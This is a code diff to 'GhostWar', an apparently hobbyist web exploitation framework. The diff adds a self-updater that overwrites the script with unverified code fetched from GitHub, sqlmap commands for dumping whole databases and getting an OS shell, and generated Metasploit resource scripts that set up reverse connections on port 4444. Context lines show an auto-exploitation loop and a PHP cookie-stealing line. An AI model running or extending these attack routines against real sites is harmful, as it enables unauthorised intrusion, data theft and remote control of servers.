@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 """
-Advanced Professional Vulnerability Scanner v3.0
-Multi-threaded, Feature-rich Security Testing Framework
+GhostWar - Advanced Vulnerability Scanner & Exploitation Framework
+Intelligence Cyber Force (ICF)
+GitHub: https://github.com/cyberss20/GhostWar
+Version: 3.0
 """
 
 import requests
@@ -19,8 +21,198 @@ from datetime import datetime
 import base64
 import random
 import sys
+import os
 
 init(autoreset=True)
+
+# Global Configuration
+GITHUB_REPO = "cyberss20/GhostWar"
+GITHUB_RAW_URL = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/"
+CURRENT_VERSION = "3.0"
+
+def show_loading_animation(message, duration=3):
+    """Show loading animation"""
+    animations = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
+    end_time = time.time() + duration
+    i = 0
+    while time.time() < end_time:
+        print(f"\r{Fore.CYAN}[{animations[i % len(animations)]}] {message}...", end='', flush=True)
+        time.sleep(0.1)
+        i += 1
+    print(f"\r{Fore.GREEN}[✓] {message} - Done!{' ' * 20}")
+
+def show_progress_bar(current, total, prefix='', suffix='', length=50):
+    """Show progress bar"""
+    percent = 100 * (current / float(total))
+    filled = int(length * current // total)
+    bar = '█' * filled + '░' * (length - filled)
+    print(f'\r{Fore.CYAN}{prefix} |{bar}| {percent:.1f}% {suffix}', end='', flush=True)
+    if current == total:
+        print()
+
+def check_for_updates():
+    """Check for updates from GitHub"""
+    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
+    print(f"{Fore.CYAN}║          CHECKING FOR UPDATES                              ║")
+    print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
+    
+    try:
+        # Check version from GitHub
+        version_url = f"{GITHUB_RAW_URL}version.txt"
+        show_loading_animation("Connecting to GitHub", 2)
+        
+        response = requests.get(version_url, timeout=10)
+        
+        if response.status_code == 200:
+            latest_version = response.text.strip()
+            print(f"{Fore.YELLOW}[*] Current Version: {CURRENT_VERSION}")
+            print(f"{Fore.YELLOW}[*] Latest Version: {latest_version}")
+            
+            if latest_version != CURRENT_VERSION:
+                print(f"\n{Fore.GREEN}[+] New version available!")
+                print(f"{Fore.YELLOW}[*] Changelog:")
+                
+                # Get changelog
+                try:
+                    changelog_url = f"{GITHUB_RAW_URL}CHANGELOG.md"
+                    changelog_resp = requests.get(changelog_url, timeout=10)
+                    if changelog_resp.status_code == 200:
+                        print(f"{Fore.CYAN}{changelog_resp.text[:300]}...")
+                except:
+                    pass
+                
+                return True, latest_version
+            else:
+                print(f"{Fore.GREEN}[+] You have the latest version!")
+                return False, CURRENT_VERSION
+        else:
+            print(f"{Fore.RED}[-] Could not check for updates")
+            return False, CURRENT_VERSION
+            
+    except requests.exceptions.RequestException as e:
+        print(f"{Fore.RED}[-] Update check failed: No internet connection")
+        return False, CURRENT_VERSION
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error checking updates: {str(e)}")
+        return False, CURRENT_VERSION
+
+def download_update():
+    """Download and install updates from GitHub"""
+    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
+    print(f"{Fore.CYAN}║          DOWNLOADING UPDATE                                ║")
+    print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
+    
+    try:
+        # Backup current file
+        current_file = __file__
+        backup_file = f"{current_file}.backup"
+        
+        print(f"{Fore.YELLOW}[*] Creating backup...")
+        show_loading_animation("Backing up current version", 2)
+        
+        try:
+            import shutil
+            shutil.copy2(current_file, backup_file)
+            print(f"{Fore.GREEN}[+] Backup created: {backup_file}")
+        except:
+            print(f"{Fore.YELLOW}[-] Could not create backup")
+        
+        # Download new version
+        print(f"\n{Fore.YELLOW}[*] Downloading update from GitHub...")
+        main_url = f"{GITHUB_RAW_URL}vuln_scanner.py"
+        
+        response = requests.get(main_url, stream=True, timeout=30)
+        total_size = int(response.headers.get('content-length', 0))
+        
+        downloaded = 0
+        block_size = 8192
+        new_content = b''
+        
+        for data in response.iter_content(block_size):
+            downloaded += len(data)
+            new_content += data
+            if total_size:
+                show_progress_bar(downloaded, total_size, 
+                                prefix='Downloading', 
+                                suffix=f'{downloaded//1024}KB/{total_size//1024}KB')
+        
+        # Write new file
+        print(f"\n{Fore.YELLOW}[*] Installing update...")
+        show_loading_animation("Writing new version", 2)
+        
+        with open(current_file, 'wb') as f:
+            f.write(new_content)
+        
+        print(f"{Fore.GREEN}[+] Update installed successfully!")
+        print(f"\n{Fore.CYAN}[*] Please restart the tool to use the new version")
+        print(f"{Fore.CYAN}[*] Command: python {os.path.basename(current_file)}")
+        
+        return True
+        
+    except Exception as e:
+        print(f"\n{Fore.RED}[-] Update failed: {str(e)}")
+        
+        # Restore backup if exists
+        if os.path.exists(backup_file):
+            print(f"{Fore.YELLOW}[*] Restoring backup...")
+            try:
+                shutil.copy2(backup_file, current_file)
+                print(f"{Fore.GREEN}[+] Backup restored")
+            except:
+                pass
+        
+        return False
+
+def update_menu():
+    """Update menu"""
+    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
+    print(f"{Fore.CYAN}║          UPDATE MANAGER                                    ║")
+    print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
+    
+    print(f"{Fore.GREEN}[1] Check for Updates")
+    print(f"{Fore.GREEN}[2] Force Update (Download Latest)")
+    print(f"{Fore.GREEN}[3] View Current Version")
+    print(f"{Fore.GREEN}[4] Visit GitHub Repository")
+    print(f"{Fore.GREEN}[0] Back to Main Menu")
+    
+    choice = input(f"\n{Fore.YELLOW}Choice: ").strip()
+    
+    if choice == '1':
+        update_available, latest = check_for_updates()
+        if update_available:
+            print(f"\n{Fore.YELLOW}[?] Download and install update? (y/n)")
+            confirm = input(f"{Fore.GREEN}Choice: ").strip().lower()
+            if confirm == 'y':
+                if download_update():
+                    print(f"\n{Fore.GREEN}[+] Update complete! Exiting...")
+                    time.sleep(2)
+                    sys.exit(0)
+    
+    elif choice == '2':
+        print(f"\n{Fore.YELLOW}[!] This will download the latest version from GitHub")
+        print(f"{Fore.YELLOW}[?] Continue? (y/n)")
+        confirm = input(f"{Fore.GREEN}Choice: ").strip().lower()
+        if confirm == 'y':
+            if download_update():
+                print(f"\n{Fore.GREEN}[+] Update complete! Exiting...")
+                time.sleep(2)
+                sys.exit(0)
+    
+    elif choice == '3':
+        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
+        print(f"{Fore.CYAN}║          VERSION INFORMATION                               ║")
+        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
+        print(f"{Fore.YELLOW}Tool: GhostWar")
+        print(f"{Fore.YELLOW}Version: {CURRENT_VERSION}")
+        print(f"{Fore.YELLOW}Organization: Intelligence Cyber Force (ICF)")
+        print(f"{Fore.YELLOW}GitHub: https://github.com/{GITHUB_REPO}")
+    
+    elif choice == '4':
+        print(f"\n{Fore.CYAN}[*] GitHub Repository:")
+        print(f"{Fore.GREEN}https://github.com/{GITHUB_REPO}")
+        print(f"\n{Fore.YELLOW}[*] Open this URL in your browser")
+    
+    input(f"\n{Fore.CYAN}Press Enter to continue...")
 
 class AdvancedScanner:
     def __init__(self, target_url):
@@ -205,6 +397,35 @@ class AdvancedScanner:
         post = input(f"\n{Fore.YELLOW}Post-Exploitation [1-2] (default: 1): ").strip() or '1'
         self.config['post_exploitation'] = (post == '1')
         
+        # Advanced Tools Integration
+        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
+        print(f"{Fore.CYAN}║          EXTERNAL TOOLS INTEGRATION                        ║")
+        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝")
+        
+        # Nmap Integration
+        print(f"\n{Fore.CYAN}[11] Use Nmap for Port Scanning:")
+        print(f"{Fore.GREEN}    [1] Yes - Advanced port & service detection")
+        print(f"{Fore.GREEN}    [2] No - Use built-in scanner")
+        
+        nmap = input(f"\n{Fore.YELLOW}Use Nmap [1-2] (default: 2): ").strip() or '2'
+        self.config['use_nmap'] = (nmap == '1')
+        
+        # SQLmap Integration
+        print(f"\n{Fore.CYAN}[12] Use SQLmap for SQL Injection:")
+        print(f"{Fore.GREEN}    [1] Yes - Professional SQL exploitation")
+        print(f"{Fore.GREEN}    [2] No - Use built-in methods")
+        
+        sqlmap = input(f"\n{Fore.YELLOW}Use SQLmap [1-2] (default: 2): ").strip() or '2'
+        self.config['use_sqlmap'] = (sqlmap == '1')
+        
+        # Metasploit Integration
+        print(f"\n{Fore.CYAN}[13] Generate Metasploit Exploits:")
+        print(f"{Fore.GREEN}    [1] Yes - Create MSF commands")
+        print(f"{Fore.GREEN}    [2] No - Skip Metasploit")
+        
+        msf = input(f"\n{Fore.YELLOW}Use Metasploit [1-2] (default: 2): ").strip() or '2'
+        self.config['use_metasploit'] = (msf == '1')
+        
         # Summary
         print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
         print(f"{Fore.GREEN}║          CONFIGURATION SUMMARY                             ║")
@@ -223,7 +444,10 @@ class AdvancedScanner:
         print(f"{Fore.CYAN}WAF Bypass: {Fore.YELLOW}{'YES' if self.config['waf_bypass'] else 'NO'}")
         print(f"{Fore.CYAN}AI Payloads: {Fore.YELLOW}{'YES' if self.config['use_ai_payloads'] else 'NO'}")
         print(f"{Fore.CYAN}Obfuscation Level: {Fore.YELLOW}{self.config['obfuscation_level'].upper()}")
-        print(f"{Fore.CYAN}Post-Exploitation: {Fore.YELLOW}{'YES' if self.config['post_exploitation'] else 'NO'}\n")
+        print(f"{Fore.CYAN}Post-Exploitation: {Fore.YELLOW}{'YES' if self.config['post_exploitation'] else 'NO'}")
+        print(f"{Fore.CYAN}Use Nmap: {Fore.YELLOW}{'YES' if self.config.get('use_nmap', False) else 'NO'}")
+        print(f"{Fore.CYAN}Use SQLmap: {Fore.YELLOW}{'YES' if self.config.get('use_sqlmap', False) else 'NO'}")
+        print(f"{Fore.CYAN}Use Metasploit: {Fore.YELLOW}{'YES' if self.config.get('use_metasploit', False) else 'NO'}\n")
         
         confirm = input(f"{Fore.YELLOW}Proceed with this configuration? (y/n): ").strip().lower()
         if confirm != 'y':
@@ -2065,7 +2289,239 @@ function security_check() {
         
         return False
     
-    def extract_all_emails(self, urls):
+    def run_nmap_scan(self):
+        """Run Nmap scan for detailed port and service detection"""
+        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
+        print(f"{Fore.CYAN}║          NMAP ADVANCED SCANNING                            ║")
+        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
+        
+        print(f"{Fore.YELLOW}[*] Checking if Nmap is installed...")
+        
+        try:
+            import subprocess
+            result = subprocess.run(['nmap', '--version'], capture_output=True, text=True)
+            if result.returncode == 0:
+                print(f"{Fore.GREEN}[+] Nmap is installed")
+            else:
+                print(f"{Fore.RED}[-] Nmap not found. Install: pkg install nmap")
+                return
+        except FileNotFoundError:
+            print(f"{Fore.RED}[-] Nmap not installed")
+            print(f"{Fore.YELLOW}[*] Install with: pkg install nmap")
+            return
+        
+        print(f"\n{Fore.YELLOW}[*] Select Nmap scan type:")
+        print(f"{Fore.GREEN}[1] Quick Scan (Fast)")
+        print(f"{Fore.GREEN}[2] Full Port Scan (All 65535 ports)")
+        print(f"{Fore.GREEN}[3] Service Detection")
+        print(f"{Fore.GREEN}[4] OS Detection")
+        print(f"{Fore.GREEN}[5] Vulnerability Scan (NSE scripts)")
+        print(f"{Fore.GREEN}[6] Aggressive Scan (All features)")
+        
+        choice = input(f"\n{Fore.YELLOW}Choice (default: 1): ").strip() or '1'
+        
+        # Nmap commands
+        nmap_commands = {
+            '1': f'nmap -F {self.domain}',
+            '2': f'nmap -p- {self.domain}',
+            '3': f'nmap -sV {self.domain}',
+            '4': f'nmap -O {self.domain}',
+            '5': f'nmap --script vuln {self.domain}',
+            '6': f'nmap -A -T4 {self.domain}'
+        }
+        
+        cmd = nmap_commands.get(choice, nmap_commands['1'])
+        
+        print(f"\n{Fore.CYAN}[*] Running: {cmd}")
+        print(f"{Fore.YELLOW}[*] This may take several minutes...\n")
+        
+        try:
+            import subprocess
+            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=300)
+            
+            output = result.stdout
+            print(f"{Fore.GREEN}{output}")
+            
+            # Parse and save results
+            nmap_file = f"nmap_scan_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+            with open(nmap_file, 'w') as f:
+                f.write(f"Nmap Scan Results\n")
+                f.write(f"Target: {self.domain}\n")
+                f.write(f"Command: {cmd}\n")
+                f.write("="*60 + "\n\n")
+                f.write(output)
+            
+            print(f"\n{Fore.GREEN}[+] Nmap results saved: {nmap_file}")
+            
+            # Extract open ports
+            import re
+            ports = re.findall(r'(\d+)/tcp\s+open', output)
+            if ports:
+                print(f"\n{Fore.GREEN}[+] Open ports found: {', '.join(ports)}")
+                self.open_ports.extend([int(p) for p in ports])
+            
+        except subprocess.TimeoutExpired:
+            print(f"{Fore.RED}[-] Scan timeout")
+        except Exception as e:
+            print(f"{Fore.RED}[-] Error: {str(e)}")
+    
+    def run_sqlmap_attack(self, vuln):
+        """Run SQLmap for advanced SQL injection exploitation"""
+        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
+        print(f"{Fore.CYAN}║          SQLMAP ADVANCED EXPLOITATION                      ║")
+        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
+        
+        print(f"{Fore.YELLOW}[*] Checking if SQLmap is installed...")
+        
+        try:
+            import subprocess
+            result = subprocess.run(['sqlmap', '--version'], capture_output=True, text=True)
+            if result.returncode == 0:
+                print(f"{Fore.GREEN}[+] SQLmap is installed")
+            else:
+                print(f"{Fore.RED}[-] SQLmap not found")
+                print(f"{Fore.YELLOW}[*] Install with: git clone https://github.com/sqlmapproject/sqlmap.git")
+                return False
+        except FileNotFoundError:
+            print(f"{Fore.RED}[-] SQLmap not installed")
+            print(f"{Fore.YELLOW}[*] Install: pkg install sqlmap")
+            return False
+        
+        target_url = vuln.get('url', self.target)
+        
+        print(f"\n{Fore.YELLOW}[*] Select SQLmap attack:")
+        print(f"{Fore.GREEN}[1] Basic Detection")
+        print(f"{Fore.GREEN}[2] Enumerate Databases")
+        print(f"{Fore.GREEN}[3] Dump Database")
+        print(f"{Fore.GREEN}[4] Dump All Tables")
+        print(f"{Fore.GREEN}[5] Get OS Shell")
+        print(f"{Fore.GREEN}[6] Full Automated Attack")
+        
+        choice = input(f"\n{Fore.YELLOW}Choice (default: 6): ").strip() or '6'
+        
+        # SQLmap commands
+        base_cmd = f'sqlmap -u "{target_url}" --batch --random-agent'
+        
+        sqlmap_commands = {
+            '1': f'{base_cmd} --dbs',
+            '2': f'{base_cmd} --dbs',
+            '3': f'{base_cmd} --dbs --current-db --dump',
+            '4': f'{base_cmd} --dump-all',
+            '5': f'{base_cmd} --os-shell',
+            '6': f'{base_cmd} --dbs --tables --columns --dump --threads=5'
+        }
+        
+        cmd = sqlmap_commands.get(choice, sqlmap_commands['6'])
+        
+        print(f"\n{Fore.CYAN}[*] Running SQLmap...")
+        print(f"{Fore.YELLOW}[*] Command: {cmd}")
+        print(f"{Fore.YELLOW}[*] This may take several minutes...\n")
+        
+        try:
+            import subprocess
+            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
+                                     stderr=subprocess.PIPE, text=True)
+            
+            # Stream output
+            for line in process.stdout:
+                print(line, end='')
+            
+            process.wait()
+            
+            print(f"\n{Fore.GREEN}[+] SQLmap completed!")
+            print(f"{Fore.CYAN}[*] Check ~/.sqlmap/output/ for detailed results")
+            
+            return True
+            
+        except Exception as e:
+            print(f"{Fore.RED}[-] Error: {str(e)}")
+            return False
+    
+    def run_metasploit_exploit(self, vuln):
+        """Generate Metasploit commands for exploitation"""
+        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
+        print(f"{Fore.CYAN}║          METASPLOIT EXPLOIT GENERATOR                      ║")
+        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
+        
+        vuln_type = vuln.get('type', '')
+        
+        # Metasploit module suggestions based on vulnerability
+        msf_modules = {
+            'WordPress': [
+                'exploit/unix/webapp/wp_admin_shell_upload',
+                'auxiliary/scanner/http/wordpress_login_enum',
+                'exploit/unix/webapp/wp_file_manager_rce',
+                'exploit/unix/webapp/wp_xmlrpc_pingback'
+            ],
+            'SQL Injection': [
+                'auxiliary/admin/mssql/mssql_exec',
+                'auxiliary/scanner/mssql/mssql_login',
+                'exploit/multi/http/struts_code_exec_classloader'
+            ],
+            'File Upload': [
+                'exploit/multi/http/php_cgi_arg_injection',
+                'exploit/unix/webapp/php_include'
+            ]
+        }
+        
+        print(f"{Fore.YELLOW}[*] Vulnerability Type: {vuln_type}")
+        print(f"{Fore.YELLOW}[*] Target: {vuln.get('url', self.target)}\n")
+        
+        # Determine relevant modules
+        relevant_modules = []
+        if 'WordPress' in self.technologies:
+            relevant_modules.extend(msf_modules['WordPress'])
+        if 'SQL' in vuln_type:
+            relevant_modules.extend(msf_modules['SQL Injection'])
+        if 'Upload' in vuln_type:
+            relevant_modules.extend(msf_modules['File Upload'])
+        
+        if not relevant_modules:
+            relevant_modules = [
+                'auxiliary/scanner/http/dir_scanner',
+                'auxiliary/scanner/http/files_dir',
+                'exploit/multi/http/struts2_content_type_ognl'
+            ]
+        
+        print(f"{Fore.GREEN}[+] Suggested Metasploit Modules:\n")
+        for i, module in enumerate(relevant_modules, 1):
+            print(f"{Fore.CYAN}[{i}] {module}")
+        
+        print(f"\n{Fore.YELLOW}[*] Metasploit Commands:\n")
+        
+        # Generate RC file for automation
+        rc_commands = [
+            f"# Metasploit Resource Script",
+            f"# Target: {self.target}",
+            f"# Generated: {datetime.now()}",
+            "",
+            f"use {relevant_modules[0]}",
+            f"set RHOSTS {self.domain}",
+            f"set RPORT 80",
+            f"set LHOST YOUR_IP",
+            f"set LPORT 4444",
+            f"exploit -j",
+            ""
+        ]
+        
+        for cmd in rc_commands:
+            print(f"{Fore.GREEN}{cmd}")
+        
+        # Save RC file
+        rc_file = f"metasploit_{self.domain}.rc"
+        with open(rc_file, 'w') as f:
+            f.write('\n'.join(rc_commands))
+        
+        print(f"\n{Fore.GREEN}[+] Metasploit RC file saved: {rc_file}")
+        print(f"\n{Fore.YELLOW}[*] To use:")
+        print(f"{Fore.CYAN}msfconsole -r {rc_file}")
+        print(f"\n{Fore.YELLOW}[*] Or manually:")
+        print(f"{Fore.CYAN}msfconsole")
+        print(f"{Fore.CYAN}msf6 > use {relevant_modules[0]}")
+        print(f"{Fore.CYAN}msf6 > set RHOSTS {self.domain}")
+        print(f"{Fore.CYAN}msf6 > exploit")
+        
+        return rc_file
         """Extract all email addresses from website"""
         print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
         print(f"{Fore.CYAN}║          EMAIL HARVESTER                                   ║")
@@ -2372,43 +2828,88 @@ DETAILED FINDINGS
                             if x['severity'] in priority_order else 999)
         
         print(f"{Fore.YELLOW}[*] Found {len(sorted_vulns)} exploitable vulnerabilities")
-        print(f"{Fore.YELLOW}[*] Auto-exploiting in order of severity...\n")
+        print(f"{Fore.YELLOW}[*] Will exploit in order of severity\n")
         
         # Show current configuration
-        print(f"{Fore.CYAN}[*] Using configuration:")
+        print(f"{Fore.CYAN}[*] Configuration:")
         print(f"{Fore.CYAN}    Brute Force: {self.config['brute_force_mode'].upper()}")
         print(f"{Fore.CYAN}    SQL Mode: {self.config['sql_attack_mode'].upper()}")
-        print(f"{Fore.CYAN}    Continue: {'YES' if self.config['continue_on_success'] else 'NO'}\n")
+        if self.config.get('use_nmap'):
+            print(f"{Fore.CYAN}    Nmap: ENABLED")
+        if self.config.get('use_sqlmap'):
+            print(f"{Fore.CYAN}    SQLmap: ENABLED")
+        if self.config.get('use_metasploit'):
+            print(f"{Fore.CYAN}    Metasploit: ENABLED")
+        print()
         
         exploited_count = 0
         success_count = 0
+        skipped_count = 0
         
         for i, vuln in enumerate(sorted_vulns, 1):
             color = Fore.RED if vuln['severity'] == 'CRITICAL' else \
                    Fore.YELLOW if vuln['severity'] == 'HIGH' else Fore.CYAN
             
             print(f"\n{color}{'='*70}")
-            print(f"{color}[{i}/{len(sorted_vulns)}] Auto-Exploiting: {vuln['type']} - {vuln['severity']}")
-            print(f"{color}{'='*70}")
+            print(f"{color}[{i}/{len(sorted_vulns)}] {vuln['type']} - {vuln['severity']}")
+            print(f"{color}URL: {vuln['url'][:60]}")
+            print(f"{color}{'='*70}\n")
             
-            # Determine exploit type and execute
+            # Ask before exploiting each vulnerability
+            print(f"{Fore.GREEN}[?] Exploit this vulnerability?")
+            print(f"{Fore.CYAN}    y    = Yes, exploit now")
+            print(f"{Fore.CYAN}    n    = No, skip this one")
+            print(f"{Fore.CYAN}    skip = Skip all remaining")
+            print(f"{Fore.CYAN}    quit = Exit exploitation mode")
+            
+            exploit_choice = input(f"\n{Fore.YELLOW}Choice: ").strip().lower()
+            
+            if exploit_choice == 'quit':
+                print(f"{Fore.YELLOW}[-] Exiting exploitation mode")
+                break
+            elif exploit_choice == 'skip':
+                print(f"{Fore.YELLOW}[-] Skipping all remaining vulnerabilities")
+                skipped_count += len(sorted_vulns) - i + 1
+                break
+            elif exploit_choice == 'n':
+                print(f"{Fore.YELLOW}[-] Skipping this vulnerability")
+                skipped_count += 1
+                continue
+            
+            # Execute exploit
+            print(f"\n{Fore.CYAN}[*] Starting exploitation...")
             success = self.auto_execute_exploit(vuln)
             
             exploited_count += 1
+            
             if success:
                 success_count += 1
-                print(f"\n{Fore.GREEN}[+] Exploitation SUCCESSFUL!")
+                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  ✓ EXPLOITATION SUCCESSFUL!                                ║")
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝")
                 
                 # Check if should continue
                 if not self.config['continue_on_success']:
                     print(f"\n{Fore.YELLOW}[*] Stopping (continue_on_success = False)")
                     break
                 
-                # Brief pause before next
+                # Ask to continue
+                print(f"\n{Fore.GREEN}[?] Continue to next vulnerability? (y/n)")
+                cont_choice = input(f"{Fore.CYAN}Choice: ").strip().lower()
+                if cont_choice != 'y':
+                    break
+                
                 time.sleep(2)
             else:
-                print(f"\n{Fore.RED}[-] Exploitation FAILED")
-                # Continue to next automatically
+                print(f"\n{Fore.RED}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.RED}║  ✗ EXPLOITATION FAILED                                     ║")
+                print(f"{Fore.RED}╚════════════════════════════════════════════════════════════╝")
+                
+                # Ask to continue after failure
+                print(f"\n{Fore.YELLOW}[?] Try next vulnerability? (y/n)")
+                cont_choice = input(f"{Fore.CYAN}Choice: ").strip().lower()
+                if cont_choice != 'y':
+                    break
             
             time.sleep(1)
         
@@ -2416,9 +2917,11 @@ DETAILED FINDINGS
         print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
         print(f"{Fore.CYAN}║          AUTO EXPLOITATION SUMMARY                         ║")
         print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
-        print(f"{Fore.YELLOW}[*] Attempted: {exploited_count}/{len(sorted_vulns)}")
-        print(f"{Fore.GREEN}[+] Successful: {success_count}")
-        print(f"{Fore.RED}[-] Failed: {exploited_count - success_count}\n")
+        print(f"{Fore.YELLOW}Total Vulnerabilities: {len(sorted_vulns)}")
+        print(f"{Fore.YELLOW}Attempted: {exploited_count}")
+        print(f"{Fore.GREEN}Successful: {success_count}")
+        print(f"{Fore.RED}Failed: {exploited_count - success_count}")
+        print(f"{Fore.CYAN}Skipped: {skipped_count}\n")
     
     def auto_execute_exploit(self, vuln):
         """Automatically execute appropriate exploit"""
@@ -2427,8 +2930,52 @@ DETAILED FINDINGS
         # SQL Injection
         if 'SQL Injection' in vuln_type:
             print(f"{Fore.CYAN}[*] Detected: SQL Injection")
-            print(f"{Fore.CYAN}[*] Auto-exploiting with bypass techniques...")
-            return self.exploit_sql_injection(vuln)
+            print(f"{Fore.CYAN}[*] Attempting exploitation...\n")
+            
+            # Step 1: Check if SQLmap should be used
+            if self.config.get('use_sqlmap', False):
+                print(f"{Fore.YELLOW}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.YELLOW}║  SQLMAP PROFESSIONAL EXPLOITATION                          ║")
+                print(f"{Fore.YELLOW}╚════════════════════════════════════════════════════════════╝\n")
+                print(f"{Fore.GREEN}[?] Use SQLmap for this SQL injection? (y/n/skip)")
+                choice = input(f"{Fore.CYAN}Choice: ").strip().lower()
+                
+                if choice == 'y':
+                    print(f"{Fore.CYAN}[*] Launching SQLmap...")
+                    success = self.run_sqlmap_attack(vuln)
+                    if success:
+                        print(f"{Fore.GREEN}[+] SQLmap exploitation completed!")
+                        return True
+                    else:
+                        print(f"{Fore.YELLOW}[-] SQLmap failed, trying built-in methods...")
+                elif choice == 'skip':
+                    print(f"{Fore.YELLOW}[-] Skipping all SQL injection exploitation")
+                    return False
+                else:
+                    print(f"{Fore.CYAN}[*] Using built-in SQL exploitation...")
+            
+            # Step 2: Fallback to built-in methods
+            print(f"\n{Fore.YELLOW}╔════════════════════════════════════════════════════════════╗")
+            print(f"{Fore.YELLOW}║  BUILT-IN SQL EXPLOITATION                                 ║")
+            print(f"{Fore.YELLOW}╚════════════════════════════════════════════════════════════╝\n")
+            
+            success = self.exploit_sql_injection(vuln)
+            
+            if success:
+                return True
+            
+            # Step 3: Generate Metasploit commands if configured
+            if self.config.get('use_metasploit', False):
+                print(f"\n{Fore.YELLOW}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.YELLOW}║  METASPLOIT EXPLOIT GENERATION                             ║")
+                print(f"{Fore.YELLOW}╚════════════════════════════════════════════════════════════╝\n")
+                print(f"{Fore.GREEN}[?] Generate Metasploit commands? (y/n)")
+                choice = input(f"{Fore.CYAN}Choice: ").strip().lower()
+                
+                if choice == 'y':
+                    self.run_metasploit_exploit(vuln)
+            
+            return False
         
         # XSS
         elif 'XSS' in vuln_type:
@@ -2544,6 +3091,12 @@ DETAILED FINDINGS
         
         else:
             print(f"{Fore.YELLOW}[-] No auto-exploit available for: {vuln_type}")
+            
+            # Generate Metasploit commands if configured
+            if self.config.get('use_metasploit', False):
+                print(f"\n{Fore.YELLOW}[*] Generating Metasploit exploit commands...")
+                self.run_metasploit_exploit(vuln)
+            
             return False
     
     def auto_exploit_xss(self, vuln):
@@ -2896,6 +3449,27 @@ file_put_contents('cookies.txt', $_GET['c']."\\n", FILE_APPEND);
         self.scan_ports()
         self.find_subdomains()
         
+        # Use Nmap if configured - with confirmation
+        if self.config.get('use_nmap', False):
+            print(f"\n{Fore.YELLOW}╔════════════════════════════════════════════════════════════╗")
+            print(f"{Fore.YELLOW}║  NMAP ADVANCED PORT SCANNING                               ║")
+            print(f"{Fore.YELLOW}╚════════════════════════════════════════════════════════════╝\n")
+            print(f"{Fore.GREEN}[?] Run Nmap scan now? (y/n/skip)")
+            print(f"{Fore.CYAN}    y    = Run Nmap (may take time)")
+            print(f"{Fore.CYAN}    n    = Use built-in port scanner only")
+            print(f"{Fore.CYAN}    skip = Skip port scanning completely")
+            
+            nmap_choice = input(f"\n{Fore.YELLOW}Choice: ").strip().lower()
+            
+            if nmap_choice == 'y':
+                self.run_nmap_scan()
+                print(f"\n{Fore.GREEN}[+] Nmap scan completed!")
+                input(f"{Fore.CYAN}Press Enter to continue...")
+            elif nmap_choice == 'skip':
+                print(f"{Fore.YELLOW}[-] Port scanning skipped")
+            else:
+                print(f"{Fore.CYAN}[*] Using built-in port scanner results")
+        
         # Phase 2: Crawling
         print(f"\n{Fore.MAGENTA}{'='*70}")
         print(f"{Fore.MAGENTA}PHASE 2: CRAWLING & MAPPING")
@@ -2961,33 +3535,33 @@ file_put_contents('cookies.txt', $_GET['c']."\\n", FILE_APPEND);
 def print_main_menu():
     """Print main menu"""
     menu = f"""
-{Fore.RED}    0101010      0101010     010                                     
-   010101010101010101010  010 10                                    
-   010 v:43 01010101010101  010                                    
-   010     010101010101010101010                                    
-   010    01010101010101   0101                                  
-   0     0101010 010101010101010                                  
-  010   01010 0101 01010   010101 01                                 
- 010  01010 010101 0101010  010101010                                
-010  01010  010101  010101010101010                                
-0 10  01010 010 0101010101010101010                               
- 010 01010  010  0101010  010101     010                              
- 010  01010   010     010  01010101 0101                              
- 010 010101   010   010    010101010101                              
- 010  01010 0                01 0   010                               
- 010 {Fore.GREEN}Intelligence Cyber Force (ICF){Fore.RED} 010                                                                        
- 010   010101010             0     0                                  
-  0     01 01010             01  01                                
-     0   01 01010       01  010   0                                   
-     010      0101      010101010101                                  
-      0101       01     010101010101                                  
-       0101010             0101010 0                                  
-         01010      01       01                                      
-          01010101010    01                                          
-            01010101   010                                          
-              01 0101  01                                            
-                010                                                 
-               0                                                                                               
+{Fore.RED}                                    0101010      0101010     010                                     
+                                   010101010101010101010  010 10                                    
+                                   010 v:43 01010101010101  010                                    
+                                   010     010101010101010101010                                    
+                                    010    01010101010101   0101                                  
+                                     0     0101010 010101010101010                                  
+                                  010   01010 0101 01010   010101 01                                 
+                                 010  01010 010101 0101010  010101010                                
+                                010  01010  010101  010101010101010                                
+                                0 10  01010 010 0101010101010101010                               
+                                 010 01010  010  0101010  010101     010                              
+                                 010  01010   010     010  01010101 0101                              
+                                 010 010101   010   010    010101010101                              
+                                 010  01010 0                01 0   010                               
+                                 010 {Fore.GREEN}Intelligence Cyber Force (ICF){Fore.RED} 010                                    
+                                 010   010101010             0     0                                  
+                                  0     01 01010             01  01                                
+                                     0   01 01010       01  010   0                                   
+                                     010      0101      010101010101                                  
